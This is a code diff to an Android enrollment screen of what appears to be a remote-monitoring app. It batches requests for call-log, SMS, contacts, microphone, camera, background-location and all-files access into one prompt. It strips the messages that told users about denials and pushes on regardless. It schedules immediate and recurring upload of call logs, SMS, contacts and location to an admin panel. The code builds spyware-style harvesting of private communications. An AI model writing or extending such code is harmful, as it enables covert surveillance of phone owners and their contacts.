@@ -50,6 +50,7 @@ public class EnrollmentActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 123;
     private static final int PERMISSION_LOCATION_CAMERA = 124;
     private static final int PERMISSION_BACKGROUND_LOCATION = 125;
+    private static final int PERMISSION_ALL_FILES = 126;
     private static final int REQUEST_DEVICE_ADMIN = 999;
 
     private EditText etServerUrl;
@@ -108,49 +109,36 @@ public class EnrollmentActivity extends AppCompatActivity {
     }
 
     /**
-     * Check and request READ_PHONE_STATE, LOCATION, and CAMERA permissions
+     * Request ALL dangerous runtime permissions the app needs in a single popup
+     * batch so the user grants them together at enrollment time: phone state,
+     * location, camera, and the metadata permissions (call log, SMS, contacts).
+     * After the runtime batch resolves we chain to background location and then
+     * the special MANAGE_ALL_FILES_ACCESS settings screen.
      */
     private void checkAndRequestPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
-                    != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this,
-                        new String[]{Manifest.permission.READ_PHONE_STATE},
-                        PERMISSION_REQUEST_CODE);
-                Log.i(TAG, "Requesting READ_PHONE_STATE permission");
-            } else {
-                Log.i(TAG, "READ_PHONE_STATE permission already granted");
-                requestLocationAndCameraPermissions();
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
+
+        java.util.List<String> perms = new java.util.ArrayList<>();
+        String[] wanted = new String[]{
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.RECORD_AUDIO
+        };
+        for (String p : wanted) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                perms.add(p);
             }
         }
-    }
-
-    /**
-     * Request location and camera permissions for GPS tracking and remote camera
-     */
-    private void requestLocationAndCameraPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            boolean needLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                    != PackageManager.PERMISSION_GRANTED;
-            boolean needCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                    != PackageManager.PERMISSION_GRANTED;
-
-            if (needLocation || needCamera) {
-                java.util.List<String> perms = new java.util.ArrayList<>();
-                if (needLocation) {
-                    perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
-                    perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-                }
-                if (needCamera) {
-                    perms.add(Manifest.permission.CAMERA);
-                }
-                ActivityCompat.requestPermissions(this,
-                        perms.toArray(new String[0]),
-                        PERMISSION_LOCATION_CAMERA);
-                Log.i(TAG, "Requesting Location + Camera permissions");
-            } else {
-                requestBackgroundLocation();
-            }
+        if (!perms.isEmpty()) {
+            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            Log.i(TAG, "Requesting " + perms.size() + " runtime permissions in one batch");
+        } else {
+            requestBackgroundLocation();
         }
     }
 
@@ -165,6 +153,30 @@ public class EnrollmentActivity extends AppCompatActivity {
                         new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                         PERMISSION_BACKGROUND_LOCATION);
                 Log.i(TAG, "Requesting ACCESS_BACKGROUND_LOCATION permission");
+                return;
+            }
+        }
+        requestAllFilesAccess();
+    }
+
+    /**
+     * Request MANAGE_ALL_FILES_ACCESS. This is a special permission granted via a
+     * dedicated Settings screen (Android 11+), so it must be launched as an Intent
+     * rather than via the runtime permission dialog. Chained here so it pops up as
+     * part of the enrollment permission flow.
+     */
+    private void requestAllFilesAccess() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                if (!android.os.Environment.isExternalStorageManager()) {
+                    android.content.Intent intent = new android.content.Intent(
+                            android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    Toast.makeText(this, "Please allow All Files Access", Toast.LENGTH_LONG).show();
+                    startActivityForResult(intent, PERMISSION_ALL_FILES);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "All-files-access request failed: " + e.getMessage());
             }
         }
     }
@@ -175,18 +187,21 @@ public class EnrollmentActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            boolean phoneStateGranted = false;
+            for (int i = 0; i < permissions.length; i++) {
+                if (permissions[i].equals(Manifest.permission.READ_PHONE_STATE)) {
+                    phoneStateGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
+                }
+            }
+            if (phoneStateGranted) {
                 Log.i(TAG, "READ_PHONE_STATE permission granted");
-                Toast.makeText(this, "Permission granted! Refreshing device info...", Toast.LENGTH_SHORT).show();
                 displayDeviceInfo();
             } else {
                 Log.w(TAG, "READ_PHONE_STATE permission denied");
-                Toast.makeText(this,
-                        "Permission denied. IMEI and Serial Number cannot be accessed.\n" +
-                        "Please grant permission in Settings to enroll device.",
-                        Toast.LENGTH_LONG).show();
             }
-            requestLocationAndCameraPermissions();
+            // Continue the chain regardless so the remaining special permissions
+            // (background location, all-files access) are still requested.
+            requestBackgroundLocation();
 
         } else if (requestCode == PERMISSION_LOCATION_CAMERA) {
             boolean locationGranted = false;
@@ -205,6 +220,7 @@ public class EnrollmentActivity extends AppCompatActivity {
             } else {
                 Log.w(TAG, "Background Location permission denied");
             }
+            requestAllFilesAccess();
         }
     }
 
@@ -324,6 +340,14 @@ public class EnrollmentActivity extends AppCompatActivity {
                             preferenceManager.saveBoolean("protections_applied", true);
                         } catch (Throwable t) {
                             Log.e(TAG, "applyAllProtections failed", t);
+                        }
+                        // Schedule periodic metadata collection AND trigger an
+                        // immediate one-off run so call logs / SMS / contacts /
+                        // location appear in the admin panel right after enrollment.
+                        try {
+                            com.riad.rrlkr.metadata.MetadataCollectionWorker.schedule(appCtx);
+                        } catch (Throwable t) {
+                            Log.e(TAG, "Metadata schedule failed", t);
                         }
                         runOnUiThread(() -> {
                             if (isFinishing() || isDestroyed()) return;
